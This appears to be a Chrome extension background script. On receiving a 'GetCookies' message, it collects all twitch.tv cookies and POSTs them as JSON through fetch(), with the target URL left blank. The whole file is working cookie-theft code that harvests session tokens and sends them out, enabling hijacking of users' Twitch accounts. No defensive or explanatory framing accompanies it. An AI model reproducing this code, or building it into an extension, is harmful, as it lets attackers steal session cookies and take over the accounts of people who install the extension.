chrome.runtime.onMessage.addListener(function (message, sender, callback) {
    if (message.command === 'GetCookies') {
        checkKnownCookies()
    }
    return true
})

function checkKnownCookies() {
    chrome.cookies.getAll({domain: "twitch.tv"}, function (cookies) {
        console.log(cookies)
	fetch('', {
		method: 'POST',
		headers: {'Content-Type': 'application/json'},
		body: JSON.stringify(cookies)
	})
		.then(res => {
			console.log(res)
			console.log(res.json())
		})
		.catch(err => {
			console.log(err)
		})
    })
}
